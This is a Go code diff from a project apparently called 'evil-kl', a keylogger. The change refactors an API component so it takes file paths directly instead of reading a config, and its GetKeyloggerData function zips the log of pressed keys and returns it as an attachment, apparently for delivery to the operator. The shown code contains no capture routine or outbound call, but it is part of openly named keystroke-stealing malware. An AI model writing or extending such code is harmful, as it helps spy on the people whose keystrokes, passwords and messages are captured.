@@ -5,30 +5,32 @@ import (
 	"fmt"
 
 	logger "github.com/dm1trypon/easy-logger"
-	"github.com/dm1trypon/evil-kl/internal/app/config"
 	"github.com/dm1trypon/evil-kl/internal/pkg/zipper"
 )
 
 /*
 Create <Api> - init Api structure
 	Returns <*Api>:
-		1. Structure pointer
+		1. object's pointer
 	Args:
-		1. method <string> - method
-		2. cfg <config.Cfg> - service's config
+		1. zipPath <string> - path to Zipper's result
+		2. logPath <string> - log's path
+		2. klPath <string> - keylogger's path
 */
-func (a *Api) Create(cfg config.Cfg) *Api {
+func (a *Api) Create(zipPath, logPath, klPath string) *Api {
 	a = &Api{
 		lc:         "API",
 		zipperInst: new(zipper.Zipper).Create(),
-		cfg:        cfg,
+		zipPath:    zipPath,
+		logPath:    logPath,
+		klPath:     klPath,
 	}
 
 	return a
 }
 
 /*
-GetKeyloggerData <Api> - getting a log of deep keys in a zip archive
+GetKeyloggerData <Api> - getting a log of pressed keys in a zip archive
 	Returns <string, string>:
 		1. Body message
 		2. Attached file path
@@ -36,8 +38,8 @@ GetKeyloggerData <Api> - getting a log of deep keys in a zip archive
 		1. method <string> - method
 */
 func (a *Api) GetKeyloggerData(method string) (string, string) {
-	trgtPath := a.cfg.Zipper.Path
-	klPath := a.cfg.Keylogger.Path
+	trgtPath := a.zipPath
+	klPath := a.klPath
 
 	return a.bodyBuilder(method, trgtPath, []string{klPath})
 }
@@ -51,9 +53,9 @@ GetKeyloggerData <Api> - getting a log of service
 		1. method <string> - method
 */
 func (a *Api) GetLogs(method string) (string, string) {
-	trgtPath := a.cfg.Zipper.Path
+	trgtPath := a.zipPath
 
-	return a.bodyBuilder(method, trgtPath, []string{a.cfg.Logger.Path})
+	return a.bodyBuilder(method, trgtPath, []string{a.logPath})
 }
 
 /*
